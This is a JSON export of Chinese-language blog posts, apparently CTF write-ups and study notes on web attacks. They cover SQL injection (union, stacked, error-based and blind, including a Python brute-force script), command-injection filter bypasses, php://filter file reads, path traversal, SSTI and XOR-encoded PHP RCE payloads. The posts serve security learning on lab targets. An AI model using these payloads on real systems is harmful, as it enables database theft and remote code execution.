[{"id":"6130d83e6b006bf68567615b79ecffd6","title":"极客大挑战 2019-LoveSQL","content":"\n进入题目\n尝试使用万能密码\n\n\n成功登录，但并没有找到flag\n返回登录页尝试寻找注入点\n\n闭合符号为单引号’\n\n用得到的账号密码测试注入点\n\n在’和– +之间输入注入语句\n1’ union select 1,2,database() – +\n\n对geek库进行暴表\n1’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema &#x3D; ‘geek’ – +\n\n对暴字段l0ve1ysq1\n1’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name &#x3D; ‘l0ve1ysq1’ and table_schema &#x3D; ‘geek’ – +\n\n暴数据\n1’ union select 1,2,group_concat(id,username,password) from geek.l0ve1ysq1 – +\n\n得到flag\n","slug":"极客大挑战-2019-LoveSQL","date":"2023-02-22T09:31:30.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"a743a232eaf01afd5b4e91218c013765","title":"极客大挑战 2019-Secret File","content":"进入题目，场景如下\n\n查看网页源代码，发现一个名为.&#x2F;Archive.php的文件\n\n访问它\n\n点击SECRET\n\n并没有发现结果\n返回Archive.php页查看源代码\n\n点击SECRET时应该发生了跳转但是速度太快\n使用burpsuite进行抓包\n\n在intruder中点击send\n\n在response中看到结果\n发现一个名为secr3t.php的文件\n访问\n\n其中用文件包含的方式引用变量file中的内容\n通过PHP协议进行访问\n构造payload:?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php\n得到flag中的内容\n\nbase64解码得到flag\n\n","slug":"极客大挑战-2019-Secret-File","date":"2023-02-18T11:29:49.000Z","categories_index":"","tags_index":"文件包含","author_index":"Aurora"},{"id":"b29060298de9e00f80f87c6f910421e7","title":"GXYCTF2019-Ping Ping Ping","content":"\n进入题目随便输入一个ip地址\n\n推测使用exec执行命令\n输入?ip&#x3D;127.0.0.1;ls得\n\n尝试用cat访问flag.php\n\n过滤了空格\n经过测试() &#x2F;等符号也都被过滤\n\n过滤了flag这个单词\n\nLinux中对空格的绕过方法：\n(1)${IFS}\n(2)$IFS$数字\n(3)&lt;\n(4)&lt;&gt;重定向符\n(5){xxx,xxx}用逗号实现空格的功能\n经测试{}&lt;&gt;都被过滤\n用$IFS$数字的方式来实现，并且通过用变量的内容进行连接来绕过对flag的过滤\n构造payload ?ip&#x3D;127.0.0.1;b&#x3D;ag;cat$IFS$1fl$b.php\n得到flag\n\n","slug":"GXYCTF2019-Ping-Ping-Ping","date":"2023-02-17T11:42:43.000Z","categories_index":"","tags_index":"exec,空格绕过","author_index":"Aurora"},{"id":"9c12cc8931e1d45af488da74ebbb23fe","title":"SUCTF 2019-EasySQL1","content":"进入题目\n\n输入数字1，有回显内容\n\n输入其他数字效果相同\n输入字母没有回显内容\n\n输入or and union等等字段回显Nonono\n\n判断这些关键字都被过滤掉了，无法进行联合查询\n尝试堆叠查询\n输入1;show tables;\n\n输入1;show columns from Flag;\n无法查看Flag表中的字段\n\n看大佬们的做法后发现本题考查的是sql_mode\nsql_mode是一组mysql支持的基本语法及校验规则\nPIPES_AS_CONCAT：将“||”视为字符串的连接操作符而非或运算符\n当 sql_mode 设置了 PIPES_AS_CONCAT 时，|| 就是字符串连接符，相当于CONCAT() 函数        当 sql_mode 没有设置 PIPES_AS_CONCAT 时 （默认没有设置），|| 就是逻辑或，相当于OR\n猜测后端的执行语句为：\nselect $_GET[&#39;query&#39;] || flag from flag\n\n在没有设置PIPES_AS_CONCAT时，后端语句的||的作用是 或\n当输入1，后端执行的语句就是select 1 from flag\n设置为PIPES_AS_CONCAT时输入1就变成了select concat(1,flag) from flag\n输入1;set sql_mode&#x3D;PIPES_AS_CONCAT;select 1\n\n另一种做法拼接*,1\n\n","slug":"SUCTF-2019-EasySQL1","date":"2023-02-14T08:25:57.000Z","categories_index":"","tags_index":"sQL注入","author_index":"Aurora"},{"id":"d2622bc92b9e5688d6557c15077022e8","title":"强网杯 2019-随便注1","content":"进入题目发现输入框中默认有一个数字1，点击提交查询有内容回显\n\n输入1’\n\n判断闭合符号为单引号’\n输入1‘ or 1&#x3D;1 – +\n\n查询出了当前表中的所有数据\n用order by查看显示列数\n1’ order by 3; – +\n\n1’ order by 2; – +\n\n列数为2\n尝试利用union联合查询获取库名\n1’ union select 1,databases(); – +\n\nselect被过滤，无法使用联合查询\n尝试堆叠注入\n堆叠注入原理：在sql中，分号表示一条语句的结束。如果在分号的后面再加一条语句，这条语句也可以被执行，继续加一个分号和一条语句，这样就可以在一次数据库的调用中执行多个语句。\n1’; show tables; – +\n得到所有表名\n\n1’;show columns from `words`; – +\n\n1’;show columns from `1919810931114514`; – +\n\n注意：在windows系统下，反单引号（&#96;）是数据库、表、索引、列和别名用的引用符\n发现要获取的flag在1919810931114514表中\nwords表的表结构中有id和data两列\n猜测提交查询的窗口默认是在words表中查询数据的\n那么查询语句很有可能是select id,data from words where id &#x3D; \n可以利用堆叠查询，将1919810931114514表更名为words，words更名为其他来获取flag\n1’;rename table words to words1;rename table  `1919810931114514` ;alter table words change flag id varchar(100)\n\n再通过1‘ or 1&#x3D;1 – +查看得到flag\n\n","slug":"强网杯-2019-随便注1","date":"2023-02-11T11:38:55.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"8ee11d581b86b5771cc67e49ad808b9c","title":"ACTF2020新生赛-Exec 1","content":"观察题目是一个执行ping命令的页面\n\n\nPHP可以模拟DOS命令中的ping命令，采用的是php的内置函数exec来调用系统的ping命令的。于是采用exec内置函数来执行\n对于exec函数：\n;前面和后面命令都要执行，无论前面真假       |直接执行后面的语句       ||如果前面命令是错的那么就执行后面的语句，否则只执行前面的语句       &amp;前面和后面命令都要执行，无论前面真假       &amp;&amp;如果前面为假，后面的命令也不执行，如果前面为真则执行两条命令\n输入127.0.0.1 | ls得\n\n输入127.0.0.1 | ls &#x2F;得\n\n输入127.0.0.1 | cat &#x2F;flag获取flag\n\n","slug":"ACTF2020新生赛-Exec-1","date":"2023-02-09T11:27:22.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"3b358db34dbaa4f263b8ee295f3f2131","title":"ACTF2020 新生赛-Include1","content":"进入题目，点击提示tips\n\n发现url中输入了file&#x3D;flag.php\n推测为文件包含，文件包含读取的是文件里的内容，可以通过base64编码的方式来读取文件flag.php\n?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php\n\nphp:&#x2F;&#x2F;filter为固定格式，convert.base64-encode为过滤器，resource&#x3D;flag.php是参数\n读取到的内容为\n\n用base64解码得到flag\n\n","slug":"ACTF2020-新生赛-Include1","date":"2023-02-08T11:19:25.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"a8af1a6f64d93e24706a1f4356026a5b","title":"HCTF-2018-WarmUp 1","content":"打开题目页面中只有一张图片，\n\nF12查看页面源码\n\n访问source.php\n &lt;?php\n    highlight_file(__FILE__);\n    class emmm\n    &#123;\n        public static function checkFile(&amp;$page)\n        &#123;\n            $whitelist &#x3D; [&quot;source&quot;&#x3D;&gt;&quot;source.php&quot;,&quot;hint&quot;&#x3D;&gt;&quot;hint.php&quot;];\n            if (! isset($page) || !is_string($page)) &#123;\n                echo &quot;you can&#39;t see it&quot;;\n                return false;\n            &#125;\n\n            if (in_array($page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; mb_substr(\n                $page,\n                0,\n                mb_strpos($page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n\n            $_page &#x3D; urldecode($page);\n            $_page &#x3D; mb_substr(\n                $_page,\n                0,\n                mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)\n            );\n            if (in_array($_page, $whitelist)) &#123;\n                return true;\n            &#125;\n            echo &quot;you can&#39;t see it&quot;;\n            return false;\n        &#125;\n    &#125;\n\n    if (! empty($_REQUEST[&#39;file&#39;])\n        &amp;&amp; is_string($_REQUEST[&#39;file&#39;])\n        &amp;&amp; emmm::checkFile($_REQUEST[&#39;file&#39;])\n    ) &#123;\n        include $_REQUEST[&#39;file&#39;];\n        exit;\n    &#125; else &#123;\n        echo &quot;&lt;br&gt;&lt;img src&#x3D;\\&quot;https:&#x2F;&#x2F;i.loli.net&#x2F;2018&#x2F;11&#x2F;01&#x2F;5bdb0d93dc794.jpg\\&quot; &#x2F;&gt;&quot;;\n    &#125;  \n?&gt; \n\n分析代码，第一段定义了一个类，类中定义了一个函数checkFile(&amp;$page)，其中定义了一个$whitelist白名单数组，数组内容是source.php和hint.php，查看hint.php\n\n! isset($page) || !is_string($page)判断输入的$page变量是否已设置且是一个字符串，in_array判断$page的内容是否在白名单中。\nmb_strpos 用于查找字符串在另一个字符串中首次出现的位置， $page . ‘?’ 会在后面自动对我们搜索文件路径添加一个 ?mb_strpos($page . ‘?’, ‘?’) 就是匹配第一次出现问号的位置。和前面的mb_substr函数一配合就会 从一开始截取到第一次问号的位置\nin_array($_page, $whitelist)判断输入的内容是否在白名单数组中，是的话返回true\n截取完之后就又会进行一次判断 if (in_array($_page, $whitelist))\n如果 $_page 在白名单里面就返true，换句话说就是检查我们输入的文件路径是否还包含 source.php或者hint.php\n因为有 mb_substr() mb_strpos() 函数所以不能直接使用问号，于是尝试对?进行两次url编码，结果为%253F\n第二段调用类中定义的函数，通过变量file输入内容\n?file&#x3D;source.php%253F..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg\n得到flag\n\n","slug":"HCTF-2018-WarmUp-1","date":"2023-02-07T11:17:47.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"688e9a26544b13828bb5688670613069","title":"极客大挑战 2019-EasySQL1","content":"\n进入题目后发现有用户名和密码两个可输入项，明显与数据库有交互，进行SQL注入判断闭合符\n\n\n报错信息为111’由此可知闭合符号为单引号’尝试使用万能密码1’ or ‘a’ &#x3D; ‘a’#\n\n万能密码的原理：SQL语句中#后的语句全部被注释掉，输入1’保证闭合完整不报错，or是或运算符，只要or前后有一项为真即可，上面语句中’a’&#x3D;’a’为恒等式，所以username是否为真就不再重要，因此称为万能密码。\n","slug":"极客大挑战-2019-EasySQL1","date":"2023-02-06T11:37:11.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"b489cff445cdd5efb0eecf16026a5aca","title":"SQL注入其三","content":"盲注脚本编写\n在长度未知的情况下，截取结果的某一位 “str” 与ascii码 [32, 128) 比较，如果所有可见字符都与结果不匹配，则说明结果是空值，也就是已超出最大长度，此时停下脚本即可根据情况选择脚本正确判断的条件，比如某些字符出现时代表页面正常或根据页面返回长度判断\n例：对sqllab靶场第八关sqli-less8的当前数据库名进行爆破的盲注脚本\nimport requests\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                res &#x3D; requests.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- + &quot;)\n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;位，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select database()&quot;)\n\n脚本运行结果：\n\n有时因为网络环境因素，经常会遇到连接超时的情况，则可能需要用到超时重发\nimport requests\n\nsession &#x3D; requests.Session()\na &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nb &#x3D; requests.adapters.HTTPAdapter(max_retries &#x3D; 3)\nsession.mount(&#39;http:&#x2F;&#x2F;&#39;,a)\nsession.mount(&#39;https:&#x2F;&#x2F;&#39;,b)\n\ndef get_info(sql):\n    result,flag &#x3D; &quot;&quot;,True\n    for i in range(1,1000):\n        if(flag):\n            flag &#x3D; False\n            for j in range(32,128):\n                try:\n                    res &#x3D; session.get(f&quot;http:&#x2F;&#x2F;www.sqli.com&#x2F;Less-8&#x2F;?id&#x3D;1&#39; and ascii(substr((&#123;sql&#125;),&#123;i&#125;,1))&#x3D;&#123;j&#125; -- +&quot;)\n                except Exception as e:\n                    exit(&quot;网络请求错误，程序退出&quot;)\n                \n                if(&quot;You are in&quot; in res.text):\n                    flag &#x3D; True\n                    result +&#x3D; chr(j)\n                    print(result)\n                    break\n        else:\n            print(f&quot;数据长度为&#123;i-2&#125;，脚本运行结束&quot;)\n            break\n    return result\n\nget_info(&quot;select version()&quot;)\n\n\n也可已通过使用二分法来提高查找效率\n脚本执行的结果可以通过os.path文件路径来保存到指定文件中\nimport os\n# 当前文件绝对路径\nprint(os.path.abspath(__file__))\n# 当前文件所在目录\nprint(os.path.dirname(os.path.abspath(__file__)))\n\n","slug":"SQL注入其三","date":"2023-02-06T11:19:41.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"c35bf4cdcf9610d9342e4b2e541833f0","title":"SQL注入其二","content":"1. 报错注入\nmysql中的一些函数在报错时，会抛出错误代码，借此可以执行一些特定的sql语句来获取数据库的信息，在有些时候虽然存在注入点能够执sql语句，但是页面中并没有打印sql执行结果的回显位置，但是如果页面能够抛出报错的代码信息，就可以利用报错回显，来查看注入的sql语句的执行结果\n报错注入常用函数\n1.floor()\n\nselect * from test where id&#x3D;1 and (select 1 from (select count(*),concat((select\n\nuser()),floor(rand(0)*2))x from information_schema.tables group by x)a);\n\n2.extractvalue()\n\nselect * from test where id&#x3D;1 and (extractvalue(1,concat(0x7e,(select\n\nuser()),0x7e)));\n\n3.updatexml()\n\nselect * from test where id&#x3D;1 and (updatexml(1,concat(0x7e,(select\n\nuser()),0x7e),1));\n\n4.geometrycollection()\n\nselect * from test where id&#x3D;1 and geometrycollection((select * from(select *\n\nfrom(select user())a)b));\n\n5.multipoint()\n\nselect * from test where id&#x3D;1 and multipoint((select * from(select * from(select\n\nuser())a)b));\n\n6.polygon()\n\nselect * from test where id&#x3D;1 and polygon((select * from(select * from(select\n\nuser())a)b));\n\n7.multipolygon()\n\nselect * from test where id&#x3D;1 and multipolygon((select * from(select *\n\nfrom(select user())a)b));\n\n8.linestring()\n\nselect * from test where id&#x3D;1 and linestring((select * from(select * from(select\n\nuser())a)b));\n\n9.multilinestring()\n\nselect * from test where id&#x3D;1 and multilinestring((select * from(select *\n\nfrom(select user())a)b));\n\n10.exp()\n\nselect * from test where id&#x3D;1 and exp(~(select * from(select user())a));\n\n2. 布尔盲注\n布尔盲注一般适用于页面没有回显字段不支持联合查询和报错注入，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 或 false 使web页面返回 true 或 false，从而达到注入的目的来获取信息，单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and 1 及 and 0来，判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n查询数据内容\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand length(database())&#x3D;8 – + # 判断当前数据库名长度\nsubstr() \\ left() 函数 截取查询结果字符进行判断\nand substr(database(),1,1)&#x3D;’a’ – + # 使用指定字符一位一位判断截取到的字符\nand left(database(),8)&#x3D;’security’ – + # 截取指定长度结果，进行判断\n# 可使用ascii函数，查询截取到字符的ascii码\nascii(substr(database(),1,1))&#x3D;115 – + # 使用ascii码一位一位比对截取到的字符\n然后用burp盲注爆破\n3. 延时注入\n延时注入是盲注的一种，在页面没有回显和报错，也不能通过拼接 and 0 、and 1 的布尔表达式来判断，sql语句是否成功执行，只能在参数后and sleep(5) ， 加上延时函数sleep()， 如果sql语句执行页面刷新就会有一定的延时，根据页面是否有延时来判断sql语句执行与否所以叫做延时注入\n单纯的输入某个符号不能判断出真正的闭合符号是什么，但是可以通过在语句后拼接 and sleep(5) 来判断sql语句有没有成功执行，如果sql语句执行了说明闭合符号找对了\n由于没有回显，我们只能利用一些函数来构造等式，判断数据内容\nlength() 函数返回一个字符串的长度，可以以用来判断字符串 sql 查询结果的长度\nand if(length(database()) &#x3D; 8, sleep(3),1) – + # 判断当前数据库名长度\n同布尔盲注可用burp进行延时注入的爆破，虽然burp爆破的方式可以实现注入，但结果不利于信息的获取，可利用注入脚本进行操作\n","slug":"SQL注入其二","date":"2023-01-15T07:43:08.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"50f911bc61e762a93882fb5a0615065b","title":"SQL注入其一","content":"1.SQL注入流程\n得到目标网站的一般信息和技术分析信息之后，就要寻找注入点和测试注入点，这些点位都是与数据库有交互的地方（且参数可控）一般在三个地方寻找注入点：(1)表单中的输入参数 (2)URL中的参数 (3) Cookie或header头中其它参数\n2.测试注入点&amp;&amp;判断闭合符号\n常用的测试符号 单引号’ 双引号’’ 无符号（直接拼接） 圆括号() 这些符号通常是服务器后台代码中用来包裹用户输入变量的字符，当插入正确的闭合字符时，会破坏原有的sql语句;\n-- +会将后接的内容视为注释，-- +注释掉了后边的语句，使sql能够正常执行\n3.万能密码原理\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1#&#39; and password &#x3D; &#39;$password&#39; limit 0,1;\n\n去掉被注释的内容，sql语句如下：\n# 由于admin账号存在，所以该语句恒为真，故登陆成功，这在sql注入中被称为万能密码\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; or 1\n\nSELECT * FROM users WHERE username &#x3D; &#39;admin&#39; and password &#x3D; &#39;123&#39; or 1#&#39; limit 0,1;\n\n4.UNION 联合查询注入\n联合查询是使用 union 或者 union all 拼接两条 select 语句来进行查询注入方式，效率非常高,后一条select语句的查询结果列数要与前一条相同\n二分法查找列数：先 order by 一个比较大的数字m，若报错再取其中位数 n 继续 order by， 若正常说明列数在 [n, m) 之间， 再取 n , m 之间的中位数 order by 如此反复多次，即可获取列数\n5.查询数据库内容常用语句\n1.暴库：select group_concat(schema_name) from information_schema.schemata;\n\n2.暴表1：select group_concat(table_name) from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39;; 加引号 table_schema&#x3D;database()表示查询当前网站使用的数据库\n\n暴表2：select table_name from information_schema.tables where\n\ntable_schema&#x3D;&#39;security&#39; limit 3,1; 加引号\n\n3.暴字段1：select group_concat(column_name) from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39;; 加引号\n\n暴字段2：select column_name from information_schema.columns where\n\ntable_name&#x3D;&#39;users&#39; and table_schema&#x3D;&#39;security&#39; limit 1,1;\n\n4.暴字段值（暴数据）：select group_concat(username,0x3a,password) from security.users; &#x2F;&#x2F;不加引号\n\n\n\n\n\n","slug":"SQL注入其一","date":"2023-01-14T01:50:00.000Z","categories_index":"","tags_index":"SQL注入","author_index":"Aurora"},{"id":"a02765d3f17045091b7948695d0675cc","title":"SSTI的理解","content":"SSTI的理解：\nSSTI和SQL注入原理差不多，都是因为对输入的字符串控制不足，把输入的字符串当成命令执行。\nSSTI引发的真正原因：render_template渲染函数的问题\nrender_template渲染函数是什么：就是把HTML涉及的页面与用户数据分离开，这样方便展示和管理。当用户输入自己的数据信息，HTML页面可以根据用户自身的信息来展示页面，因此才有了这个函数的使用。\nrender_template：\n渲染函数在渲染的时候，往往对用户输入的变量不做渲染，即： {{}}在Jinja2中作为变量包裹标识符，Jinja2在渲染的时候会把{{}}包裹的内容当做变量解析替换。比如{{1+1}}会被解析成2。因此才有了现在的模板注入漏洞。对于往往变量，我们使用{{这里是内容}}，因为{{}}包裹的东西会被解析，因此我们就可以实现类似于SQL注入的漏洞\n题目页面\n\n测试发现页面传入的参数为search\n\n使用config查看全局变量\n查看secret_key\nsearch&#x3D;{{config.SECRET_KEY}}\n\n","slug":"SSTI的理解","date":"2023-01-14T01:31:42.000Z","categories_index":"","tags_index":"","author_index":"Aurora"},{"id":"be2622c109e5481786c1d7440a312fa3","title":"无字母数字RCE","content":"题目：\n&lt;?php\nerror_reporting(0);\nif(isset($_GET[&#39;code&#39;]))&#123;\n        $code&#x3D;$_GET[&#39;code&#39;];         \n        if(preg_match(&quot;&#x2F;[a-z0-9]&#x2F;is&quot;,$code))&#123;\n            die(&quot;NO.&quot;);\n        &#125;\n        @eval($code);\n&#125;\nelse&#123;\n        highlight_file(__FILE__);\n&#125;\n?&gt;\n\n\n无字母数字进行RCE\neval函数中的内容会被视为php代码进行执行，只要令code的内容为需要进行的操作可以利用除字母数字以外的字符（ASCII码1~256中的字符）进行运算操作而凑出想要的字符，可以让code的值为\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n即：$&#123;_GET&#125;&#123;%ff&#125;();&amp;%ff&#x3D;phpinfo\n\n采用url编码异或的方式得到%0c%08”^”%60%7b &#x2F;&#x2F;ls\n$&#123;%ff%ff%ff%ff^%a0%b8%ba%ab&#125;&#123;%ff&#125;(%22%0c%08&quot;^&quot;%60%7b%22);&amp;%ff&#x3D;system\n\n即\n$&#123;_GET&#125;&#123;%ff&#125;(&quot;ls&quot;);&amp;%ff&#x3D;system\n\n执行结果\n\n查看上一层中的文件\n\n%0c%08%01%00&quot;^&quot;%60%7b%21%2f &#x2F;&#x2F;ls &#x2F;\n\n%03%01%09%01%00%06%06%06%06%0c%0c%0c%0c%01%01%01%01%07%07%07%07&quot;^&quot;%60%60%7d%21%2f%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60%60 &#x2F;&#x2F; cat &#x2F;ffffllllaaaagggg\n\n\n\n","slug":"无字母数字RCE","date":"2023-01-14T01:04:37.000Z","categories_index":"","tags_index":"","author_index":"Aurora"}]